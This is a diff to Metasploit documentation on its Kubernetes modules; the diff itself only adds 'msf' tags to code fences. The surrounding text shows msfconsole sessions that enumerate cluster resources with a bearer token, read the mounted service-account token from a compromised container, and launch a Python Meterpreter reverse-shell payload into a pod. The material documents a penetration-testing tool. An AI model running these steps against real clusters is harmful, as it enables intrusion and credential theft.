@@ -8,7 +8,7 @@ a compromised docker container, or external to the cluster if the required APIs 
 
 In the future there may be more modules than listed here, for the full list of modules run the `search` command within msfconsole:
 
-```
+```msf
 msf6 > search kubernetes
 ```
 
@@ -40,7 +40,7 @@ run session=-1
 
 If the Kubernetes API is publicly accessible and you have a JWT Token:
 
-```
+```msf
 msf6 > use cloud/kubernetes/enum_kubernetes
 msf6 auxiliary(cloud/kubernetes/enum_kubernetes) > set RHOST https://kubernetes.docker.internal:6443
 RHOST => https://kubernetes.docker.internal:6443
@@ -67,7 +67,7 @@ Namespaces
 
 By default the `run` command will enumerate all resources available, but you can also specify which actions you would like to perform:
 
-```
+```msf
 msf6 auxiliary(cloud/kubernetes/enum_kubernetes) > show actions
 
 Auxiliary actions:
@@ -114,7 +114,7 @@ The `exploit/multi/kubernetes/exec` module will attempt to create a new pod in t
 If you have a Meterpreter session on a compromised Kubernetes container with the available permissions, the module values of `NAMESPACE`, `TOKEN`, `RHOSTS` and `RPORT` module options
 will be gathered from the session host automatically. The `TOKEN` will be read from the mounted `/run/secrets/kubernetes.io/serviceaccount/token` file if available:
 
-```
+```msf
 msf6 exploit(multi/kubernetes/exec) > set TARGET Interactive\ WebSocket
 TARGET => Interactive WebSocket
 msf6 exploit(multi/kubernetes/exec) > run RHOST="" RPORT="" POD="" SESSION=-1
@@ -136,7 +136,7 @@ pwd
 
 If the Kubernetes API is available remotely, the RHOST values and token can be set manually. In this scenario a token is manually specified, to execute a Python Meterpreter payload within the `thinkphp-67f7c88cc9-tgpfh` pod:
 
-```
+```msf
 msf6 > use exploit/multi/kubernetes/exec
 [*] Using configured payload python/meterpreter/reverse_tcp
 msf6 exploit(multi/kubernetes/exec) > set TOKEN eyJhbGciOiJSUzI1...
